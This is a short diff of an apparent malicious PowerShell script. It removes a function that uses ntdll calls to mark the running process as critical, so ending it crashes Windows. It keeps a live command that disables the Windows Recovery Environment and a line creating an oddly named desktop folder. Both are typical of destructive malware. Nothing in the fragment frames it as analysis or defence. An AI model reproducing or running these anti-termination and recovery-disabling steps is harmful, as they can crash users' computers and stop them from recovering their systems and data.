@@ -1,26 +1,3 @@
-function Set-ProcessCritical {
-    $isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
-
-    if ($isAdmin) {
-        $ntdll = Add-Type -MemberDefinition @"
-        [DllImport("ntdll.dll", SetLastError = true)]
-        public static extern int RtlAdjustPrivilege(int privilege, bool enablePrivilege, bool isThreadPrivilege, out bool previousValue);
-        [DllImport("ntdll.dll", SetLastError = true)]
-        public static extern int RtlSetProcessIsCritical(int isCritical, int reserved, int needScb);
-"@ -Name "NTDLL" -Namespace "Win32" -PassThru
-
-        $null = $ntdll::RtlAdjustPrivilege(20, $true, $false, [ref] $false)
-        $null = $ntdll::RtlSetProcessIsCritical(1, 0, 0)
-        return $true
-    }
-    else {
-        return $false
-    }
-}
-
-Set-ProcessCritical
-
-
 reagentc.exe /disable
 
 $desktopPath = [System.IO.Path]::Combine([System.Environment]::GetFolderPath('Desktop'), 'hai1723fuckyou')
